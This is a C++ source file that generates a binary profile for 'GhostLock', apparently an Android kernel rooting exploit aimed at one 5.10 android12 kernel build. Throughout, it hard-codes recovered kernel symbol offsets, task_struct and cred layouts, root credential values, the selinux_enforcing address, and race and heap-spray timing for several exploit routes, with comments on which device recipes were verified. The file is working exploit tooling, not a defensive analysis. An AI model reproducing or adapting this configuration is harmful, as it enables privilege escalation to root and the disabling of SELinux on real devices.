/*
 * GhostLock profile generator for katyusha / 5.10.101-android12-9-gece0cc04d1a5.
 *
 * Fills the native transport struct from the MP6 static audit
 * (Katyusha-root-analysis/MP6-kernel-analysis) and serializes a GLK1 v2
 * document via binary_profile::serialize. Build with the NDK (same flags as
 * src/Makefile) and run on the device:  ./make_profile /data/local/tmp/katyusha.bin
 *
 * Value provenance:
 *  - offset.* : recovered kallsyms image offsets (verified against the app's
 *    own extractor output and against instruction-level evidence).
 *  - task_struct.* : machine-code derived candidates (prio, pi_lock, pi_waiters,
 *    pi_top_task, pi_blocked_on, cred, comm, seccomp, real_cred, normal_prio,
 *    sched_task_group); pid, tgid, tasks and atomic_flags have no runtime
 *    consumer and stay 0.
 *  - cred.* : init_cred image bytes (copy 0xa8, caps 0x30..0x44 = 0x1ffffffffff,
 *    refs at 0x80/0x88/0x90 = root_user/init_user_ns/init_groups).
 *  - route.multicast_waiter : sigreturn stamp geometry, waiter_off=320
 *    (buffer depth 768 - waiter depth 448), task/lock at +0x30/+0x38.
 */
#include "profile/binary.h"
#include "profile/model.h"

#include <cstdio>
#include <cstring>
#include <string>

using namespace ghostlock;

int main(int argc, char **argv) {
    const char *path = argc > 1 ? argv[1] : "katyusha-profile.bin";
    /* argv[2] == "select" -> Poco F5 recipe (upstream PR #721): select_stack
     * route + compact waiter + prio stamped flat at +0x40 (native side is the
     * word10 "prio_flat" entry in select_stack_route.cpp). Otherwise the
     * multicast_waiter route with the E3/E6a sigreturn stamp is emitted. */
    const bool select_recipe = argc > 2 && std::strcmp(argv[2], "select") == 0;
    /* argv[2] == "sony" -> copy of the ONLY on-device-verified 5.10 recipe
     * (Xperia 5 IV, same waipio SoC family, upstream #578): plain select_stack,
     * NO compact waiter, collisions=4. October's katyusha select runs used the
     * wrong mm_struct stride (1024 vs the measured 960 kept below) and the
     * pre-E engine, so this exact combination has never run here. */
    const bool sony_recipe = argc > 2 && std::strcmp(argv[2], "sony") == 0;
    /* argv[2] == "waiter_off" argv[3]=N -> sweep the sigreturn stamp's waiter
     * offset (default 320). E7 boot_id probe: if the write fires at some N,
     * the stamp was misaligned relative to the real stale waiter and N is the
     * correct alignment. */
    int waiter_off_override = -1;
    if (argc > 3 && std::strcmp(argv[2], "waiter_off") == 0) {
        waiter_off_override = std::stoi(argv[3]);
    }
    static const char kRelease[] = "5.10.101-android12-9-gece0cc04d1a5";

    /* argv[2] == "tcp" -> the tcp_zerocopy route (getsockopt(TCP_ZEROCOPY_RECEIVE)
     * parked frame + puncher race). Unlike multicast it does not depend on a
     * dangling pi_blocked_on: the stamp is consumed inside its own live race. */
    const bool tcp_recipe = argc > 2 && std::strcmp(argv[2], "tcp") == 0;
    profile::kernel_offsets p{};
    p.uname_r = kRelease;
    p.route = select_recipe ? profile::kRouteSelectStack
                  : tcp_recipe ? profile::kRouteTcpZerocopy
                               : profile::kRouteMulticastWaiter;

    p.meta.kernel_major = 5;
    p.meta.recommend_shizuku = 0;
    p.meta.fallback_route = profile::kRouteAuto;
    p.meta.safe_mode = 0;

    p.task.prio = 132;
    p.task.normal_prio = 140;
    p.task.sched_task_group = 784;
    p.task.pi_lock = 2156;
    p.task.pi_waiters = 2176;
    p.task.pi_top_task = 2192;
    p.task.pi_blocked_on = 2200;
    p.task.pid = 0;
    p.task.tgid = 0;
    p.task.atomic_flags = 0;
    p.task.real_cred = 1912;
    p.task.cred = 1920;
    p.task.comm = 1936;
    p.task.tasks = 0;
    p.task.seccomp = 2120;

    p.credential.copy_size = 0xa8;
    p.credential.usage_offset = 0;
    p.credential.usage_value = 256;
    p.credential.caps_offset = 0x30;
    p.credential.caps_count = 3;
    p.credential.caps_value = 0x1ffffffffffULL;
    p.credential.ref_count = 3;
    p.credential.ref0_offset = 0x80;
    p.credential.ref0_image = 0xffffffc0129bf1f0ULL; /* root_user */
    p.credential.ref1_offset = 0x88;
    p.credential.ref1_image = 0xffffffc0129bf288ULL; /* init_user_ns */
    p.credential.ref2_offset = 0x90;
    p.credential.ref2_image = 0xffffffc0129c0718ULL; /* init_groups */
    p.credential.ref3_offset = 0;
    p.credential.ref3_image = 0;

    p.offsets.init_task = 43695616;
    p.offsets.init_cred = 43779696;
    p.offsets.empty_zero_page = 45727744;
    p.offsets.root_task_group = 45752320;
    p.offsets.selinux_enforcing = 46471968;
    p.offsets.selinux_blob_sizes = 38551816;
    p.offsets.security_hook_heads = 38550136;
    p.offsets.slide_nfulnl_logger = 43651856;
    p.offsets.slide_loggers_0_1 = 43651656;
    p.offsets.slide_boot_id = 46576860;

    p.misc.kernel_phys_load = 2818572288ULL; /* 0xA8000000 */
    p.misc.kernel_phys_offset = 2147483648ULL; /* 0x80000000 */
    p.misc.compact_waiter = 1;
    p.misc.kernelsnitch_collisions = 8;
    /* Real sizeof(struct mm_struct) on this kernel: proc_caches_init calls
     * kmem_cache_create_usercopy("mm_struct", 0x3c0, ...) and mm_init writes
     * fields up to +0x3b8. The SLUB object stride is therefore 960, not the
     * 1024 the extractor defaulted to (a wrong stride skips 3/4 of the real
     * object slots and makes the KernelSnitch brute force miss). */
    p.misc.mm_struct_sz = 0x3c0;

    p.geometry.mcast_waiter_off = 320;
    if (waiter_off_override > 0) {
        p.geometry.mcast_waiter_off = static_cast<uint32_t>(waiter_off_override);
    }
    p.geometry.mcast_buffer_size = 528;
    p.geometry.mcast_task_offset = 48;
    p.geometry.mcast_lock_offset = 56;
    if (select_recipe) {
        /* select() frame geometry shared by the Xperia 5 IV and Poco F5
         * profiles: waiter base = word0, table base = word2. */
        p.geometry.pselect_waiter_shift = -2;
    }

    p.execution.recommended_main_cpu = 4;
    p.execution.recommended_consumer_cpu = 5;
    p.execution.heap_prepare_max_attempts = 4;
    p.execution.heap_prepare_timeout_ms = 240000;
    p.execution.heap_kernelsnitch_timeout_ms = 60000;
    p.execution.race_route_wait_ms = 1000;
    p.execution.race_route_done_timeout_ms = 300000;
    p.execution.race_setup_settle_us = 50000;
    p.execution.race_state_poll_interval_us = 1000;
    p.execution.w1_attempts = 15;
    p.execution.w1_settle_us = 100000;
    p.execution.w1_scratch_repair_attempts = 3;
    p.execution.w2_attempts = 15;
    p.execution.w2_settle_us = 100000;
    p.execution.w3_chain_rounds = 3;
    p.execution.w3_attempts = 6;
    p.execution.w3_settle_us = 50000;
    p.execution.tcp_attempts = 2000;
    p.execution.tcp_arm_sequence = 16;
    p.execution.tcp_post_receive_hold_iterations = 20000;
    p.execution.select_enter_delay_us = 50000;
    p.execution.select_timeout_us = 200000;
    /* E1 (hypothesis A): one consume attempt per window is easy to lose to the
     * requeue/adjust race. Rotate nice 64x so rt_mutex_adjust_pi walks the
     * poisoned chain repeatedly while the route window is armed. */
    p.execution.select_consumer_max_calls = 1; /* E6e: one walk, then poll enforce before any second walk can trip the mutated page tree */
    p.execution.select_consumer_burst_calls = 1;
    p.execution.handoff_pre_dispatch_settle_ms = 2000;
    p.execution.handoff_module_poll_attempts = 30;
    p.execution.handoff_module_poll_interval_ms = 100;
    p.execution.handoff_enforce_poll_attempts = 200;
    p.execution.handoff_enforce_poll_interval_ms = 100;

    std::string buffer(1 << 16, '\0');
    const int32_t written = binary_profile::serialize(
        &p, buffer.data(), buffer.size());
    if (written <= 0) {
        std::fprintf(stderr, "serialize failed (%d)\n", written);
        return 1;
    }
    FILE *f = std::fopen(path, "wb");
    if (!f) {
        std::fprintf(stderr, "cannot open %s\n", path);
        return 1;
    }
    const size_t n = std::fwrite(buffer.data(), 1, static_cast<size_t>(written), f);
    std::fclose(f);
    std::printf("wrote %zu bytes to %s\n", n, path);
    return n == static_cast<size_t>(written) ? 0 : 1;
}
